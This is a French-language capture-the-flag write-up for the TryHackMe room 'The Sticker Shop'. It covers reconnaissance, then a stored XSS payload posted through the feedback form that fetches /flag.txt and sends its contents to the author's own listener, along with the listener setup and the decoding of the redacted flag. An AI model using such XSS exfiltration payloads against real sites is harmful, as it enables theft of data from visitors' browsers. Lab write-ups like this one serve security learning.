# THE STICKER SHOP -TRY HACK ME WRITEUP
Difficulté : easy

### Objectif :
 Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at http://10.80.144.206:8080/flag.txt?

## RECONNAISSANCE
Server: Werkzeug/3.0.1 Python/3.8.10
routes : /feedback (avec formulaire), / (cat shop), /flag.txt (401)

## EXPLOITATION

Le formulaire accepte tout, donc on prevoit une attaque XSS pour obtenir le flag via un url-encoded pointé sur notre serveur,
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/thestickershop$ ip addr show tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1380 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.130.110/18 brd 192.168.191.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::7b30:b63e:6623:d5d8/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/thestickershop$ curl -i -s -X POST 'http://10.80.144.206:8080/submit_feedback' \
  --data-urlencode "feedback=<script>fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://192.168.130.110:8000/?f='+encodeURIComponent(t)})</script>"
```

On va donc créer notre webhook local avec 
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/thestickershop$ python3 -m http.server 8000 --bind 0.0.0.0
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```
Après le post, on obtient immédiatement 

```
10.80.144.206 - - [04/Nov/2026 12:28:16] "GET /?f=THM%REDACTED%7D HTTP/1.1" 200 -

```

On décode ensuite la valeur obtenu :
```
python3 -c 'import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))' 'THM%7B...%7D'
```

On obtient directement un format : THM{REDACTED}, C'est notre flag
